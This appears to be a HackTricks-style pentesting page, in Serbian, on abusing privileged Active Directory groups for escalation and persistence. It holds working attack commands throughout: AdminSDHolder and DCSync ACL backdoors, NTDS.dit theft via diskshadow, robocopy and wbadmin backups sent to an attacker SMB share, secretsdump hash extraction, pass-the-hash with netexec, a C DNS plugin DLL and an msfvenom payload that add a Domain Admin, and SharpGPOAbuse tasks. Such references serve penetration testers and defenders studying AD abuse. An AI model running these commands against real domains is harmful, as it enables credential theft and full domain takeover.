# Privilegovane grupe

{{#include ../../banners/hacktricks-training.md}}

## Dobro poznate grupe sa administratorskim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa može da kreira naloge i grupe koje nisu administratori u domenu. Takođe omogućava lokalnu prijavu na kontroler domena (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća naredba:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC.

## AdminSDHolder grupa

Lista kontrole pristupa (Access Control List, ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve „zaštićene grupe“ u Active Directory, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava zaštitu tih grupa sprečavajući neovlašćene izmene.

Napadač bi ovo mogao iskoristiti tako što bi izmenio ACL grupe **AdminSDHolder**, dodelivši potpune dozvole standardnom korisniku. To bi tom korisniku efektivno dalo potpunu kontrolu nad svim zaštićenim grupama. Ako se dozvole tog korisnika izmene ili uklone, one će zbog dizajna sistema biti automatski vraćene u roku od sat vremena.

Nedavna Windows Server dokumentacija i dalje tretira nekoliko ugrađenih operator grupa kao **zaštićene** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, itd.). Proces **SDProp** se po defaultu pokreće na **PDC Emulator** na svakih 60 minuta, postavlja `adminCount=1` i onemogućava nasleđivanje na zaštićenim objektima. Ovo je korisno i za persistence i za identifikaciju zastarelih privilegovanih korisnika koji su uklonjeni iz zaštićene grupe, ali i dalje zadržavaju ACL bez nasleđivanja.

Komande za pregled članova i izmenu dozvola uključuju:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostupan je skript za ubrzanje procesa restauracije: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje izbrisanih Active Directory objekata, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ovo je korisno za **obnavljanje prethodnih puteva privilegija**. Objekti koji su obrisani i dalje mogu otkriti `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-ove, ili DN obrisane privilegovane grupe koja kasnije može biti vraćena od strane drugog operatora.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Pristup Domain Controlleru

Pristup fajlovima na DC-u je ograničen osim ako korisnik nije član grupe `Server Operators`, koja menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem `PsService` ili `sc` iz Sysinternals, može se pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima punu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući manipulaciju servisima u cilju sticanja elevated privileges.

## Backup Operators

Članstvo u grupi `Backup Operators` omogućava pristup fajl sistemu `DC01` zahvaljujući privilegijama `SeBackup` i `SeRestore`. Ove privilegije omogućavaju folder traversal, listing i file copying, čak i bez eksplicitnih dozvola, koristeći zastavicu `FILE_FLAG_BACKUP_SEMANTICS`. Potrebno je koristiti određene skripte za ovaj proces.

Da biste prikazali članove grupe, izvršite:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni napad

Da bi se iskoristile ove privilegije lokalno, koriste se sledeći koraci:

1. Uvoz potrebnih biblioteka:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogući i potvrdi `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristup i kopiranje datoteka iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direktan pristup fajl sistemu Domain Controllera omogućava krađu baze podataka `NTDS.dit`, koja sadrži sve NTLM heševe za domenske korisnike i računare.

#### Korišćenje diskshadow.exe

1. Napravite shadow copy `C` diska:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` из shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje fajlova:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Ekstrahujte `SYSTEM` i `SAM` za dohvat hash-ova:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hashes iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nakon ekstrakcije: Pass-the-Hash ka DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korišćenje wbadmin.exe

1. Podesite NTFS fajl-sistem za SMB server na attacker machine i keširajte SMB kredencijale na target machine.
2. Koristite `wbadmin.exe` za sistemski backup i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi grupe **DnsAdmins** mogu iskoristiti svoje privilegije da učitaju proizvoljni DLL sa SYSTEM privilegijama na DNS serveru, koji se često nalazi na Domain Controllers. Ova mogućnost omogućava značajne mogućnosti za dalju eksploataciju.

Za listanje članova grupe **DnsAdmins**, koristite:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično na DC-ovima). Problem je ispravljen 2021. godine.

Members mogu naterati DNS server da učita proizvoljan DLL (lokalno ili sa udaljenog share-a) koristeći komande kao što su:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS servisa (što može zahtevati dodatna dopuštenja) je neophodno da bi se DLL učitao:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom attack vectoru, pogledajte ired.team.

#### Mimilib.dll

Takođe je izvodljivo koristiti mimilib.dll za command execution, modifikujući ga da izvršava određene komande ili reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD Record for MitM

DnsAdmins mogu manipulisati DNS records da izvedu Man-in-the-Middle (MitM) attacks kreiranjem WPAD record-a nakon onemogućavanja global query block list. Alati kao Responder ili Inveigh mogu se koristiti za spoofing i capturing network traffic.

### Event Log Readers
Members mogu pristupiti event logs, potencijalno otkrivajući osetljive informacije kao što su plaintext passwords ili detalji command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows dozvole

Ova grupa može menjati DACLs na objektu domena, što potencijalno dodeljuje DCSync privilegije. Tehnike za privilege escalation koje iskorišćavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ako možete da delujete kao član ove grupe, klasična zloupotreba je dodeljivanje attacker-controlled principal-u prava replikacije potrebnih za [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** je povezivao pristup mailbox-ima, coerced Exchange authentication i LDAP relay da bi došao do iste primitive. Čak i gde je taj relay put ublažen, direktno članstvo u `Exchange Windows Permissions` ili kontrola nad Exchange serverom ostaje visokovredan put do prava na replikaciju domena.

## Hyper-V Administrators

Hyper-V Administrators imaju potpuni pristup Hyper-V, što se može iskoristiti za sticanje kontrole nad virtualizovanim Domain Controllers. To uključuje kloniranje live DCs i izvlačenje NTLM hashes iz NTDS.dit fajla.

### Primer eksploatacije

Praktična zloupotreba je obično **offline access to DC disks/checkpoints** umesto starih host-level LPE trikova. Sa pristupom Hyper-V hostu, operator može napraviti checkpoint ili eksportovati virtualizovani Domain Controller, mount-ovati VHDX i izvući `NTDS.dit`, `SYSTEM`, i druge tajne bez diranja LSASS unutar gosta:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Odakle, ponovo iskoristite workflow `Backup Operators` da kopirate `Windows\NTDS\ntds.dit` i hive-ove registra offline.

## Group Policy Creators Owners

Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu primenjivati Group Policies na korisnike ili grupe niti uređivati postojeće GPOs.

Važna nijansa je da **kreator postaje vlasnik novog GPO-a** i obično dobija dovoljno prava da ga kasnije uređuje. To znači da je ova grupa interesantna kada možete ili:

- kreirati maliciozni GPO i ubediti admina da ga poveže na ciljanu OU/domain
- urediti GPO koji ste kreirali i koji je već povezan na nekom korisnom mestu
- zloupotrebiti drugo delegirano pravo koje vam dozvoljava da povežete GPO-e, dok vam ova grupa daje mogućnost uređivanja

Praktična zloupotreba obično znači dodavanje **Immediate Task**, **startup script**, **local admin membership**, ili promene **user rights assignment** putem SYSVOL-backed policy fajlova.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ako se GPO menja ručno preko `SYSVOL`, zapamtite da sama promena nije dovoljna: `versionNumber`, `GPT.ini`, i ponekad `gPCMachineExtensionNames` takođe moraju biti ažurirani ili klijenti će ignorisati osvežavanje politike.

## Organization Management

U okruženjima gde je raspoređen **Microsoft Exchange**, posebna grupa poznata kao **Organization Management** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupi poštanskim sandučićima svih korisnika domena** i održava **potpunu kontrolu nad Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Ova kontrola uključuje grupu **`Exchange Windows Permissions`**, koju je moguće iskoristiti za eskalaciju privilegija.

### Eksploatacija privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** imaju više privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da **se lokalno prijave na Domain Controller**, isključe ga i upravljaju štampačima. Da bi se iskoristile ove privilegije, naročito ako **`SeLoadDriverPrivilege`** nije vidljiv u kontekstu bez povišenih privilegija, neophodno je zaobići User Account Control (UAC).

Da biste nabrojali članove ove grupe, koristi se sledeća PowerShell naredba:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na Domain Controller-ima ova grupa je opasna jer podrazumevana Domain Controller Policy dodeljuje **`SeLoadDriverPrivilege`** grupi `Print Operators`. Ako dođete do povišenog tokena za člana ove grupe, možete omogućiti privilegiju i učitati potpisani, ali ranjivi driver da eskalirate u kernel/SYSTEM. Za detalje o radu sa tokenima, pogledajte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Članovima ove grupe je omogućen pristup računarima preko Remote Desktop Protocol (RDP). Za izlistavanje ovih članova dostupne su PowerShell komande:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalji uvidi u iskorišćavanje RDP-a mogu se pronaći u specijalizovanim pentesting resursima.

#### Korisnici za daljinsko upravljanje

Članovi mogu pristupiti računarima preko **Windows Remote Management (WinRM)**. Enumeracija ovih članova postiže se kroz:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za tehnike eksploatacije vezane za **WinRM**, treba konsultovati specifičnu dokumentaciju.

#### Server Operators

Ova grupa ima dozvolu da izvršava različite konfiguracije na Domain Controllers, uključujući privilegije za backup i restore, menjanje sistemskog vremena i gašenje sistema. Da biste izlistali članove, koristi se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na Domain Controllers, `Server Operators` obično nasleđuju dovoljno prava da **reconfigure or start/stop services** i takođe dobijaju `SeBackupPrivilege`/`SeRestorePrivilege` kroz podrazumevanu DC politiku. U praksi, ovo ih čini mostom između **service-control abuse** i **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ako ACL servisa daje ovoj grupi change/start rights, usmerite servis na proizvoljnu komandu, pokrenite ga kao `LocalSystem`, a zatim vratite originalni `binPath`. Ako je kontrola servisa zaključana, vratite se na gore navedene tehnike `Backup Operators` da kopirate `NTDS.dit`.

## Reference <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
